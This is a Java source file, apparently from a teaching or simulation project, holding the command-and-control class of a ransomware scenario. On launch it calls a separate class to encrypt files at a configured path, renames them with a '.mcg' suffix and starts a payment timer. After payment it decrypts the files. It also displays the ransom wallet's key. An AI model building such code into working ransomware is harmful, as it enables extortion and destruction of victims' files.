package leverCom;

import com.google.common.eventbus.Subscribe;
import configuration.Configuration;
import configuration.ConsoleCorrespondation;
import console.Console;
import console.Subscriber;
import console.TextColor;
import events.AttackEvent;
import financial.Wallet;
import person.IConsoleUser;
import pressurize.Pressurize;
import szenario.Attack;

import java.security.PublicKey;
import java.util.Base64;

public class CommandControl extends Subscriber implements IConsoleUser {
    private final RansomwareReflector reflector;
    private final Console console;
    private final Pressurize pressurize;
    private final Wallet targetWallet;

    public CommandControl(Integer id, Console console, Pressurize pressurize, Wallet targetWallet) {
        super(id);
        this.reflector = new RansomwareReflector();
        this.reflector.setPath(Configuration.instance.pathToAttack);
        this.console = console;
        this.pressurize = pressurize;
        this.targetWallet = targetWallet;
    }

    private String encodePublicKey(PublicKey key) {
        return Base64.getEncoder().encodeToString(key.getEncoded());
    }

    @Subscribe
    public void receive(AttackEvent event) {
        switch (event.getTask()) {
            case CL_LAUNCH -> {
                this.reflector.encrypt();
                this.reflector.rename(".mcg", true);
                this.writeToConsole(ConsoleCorrespondation.M_ENCRYPTED, TextColor.RED);
                pressurize.invokeTimer(); //TODO start Timer
            }
            case M_TRANSACTIONSUCCESS -> {
                this.pressurize.cancelTimer();
                Attack.getInstance().hePaid();
                this.reflector.decrypt();
                this.reflector.rename(".mcg", false);
                this.writeToConsole(ConsoleCorrespondation.M_CONGRATS, TextColor.GREEN);
            }
            case CL_SHOWRECIPIENT -> {
                ConsoleCorrespondation.M_SHOWRECIPIENT.setValue(ConsoleCorrespondation.M_SHOWRECIPIENT.getValue() + this.encodePublicKey(this.targetWallet.getPublicKey()));
                this.writeToConsole(ConsoleCorrespondation.M_SHOWRECIPIENT, TextColor.GREEN);
            }
        }
    }

    @Override
    public void writeToConsole(ConsoleCorrespondation text, TextColor color) {
        this.console.writeln(text, color);
    }

    public void writeToConsole(ConsoleCorrespondation text) {
        this.console.writeln(text);
    }
}
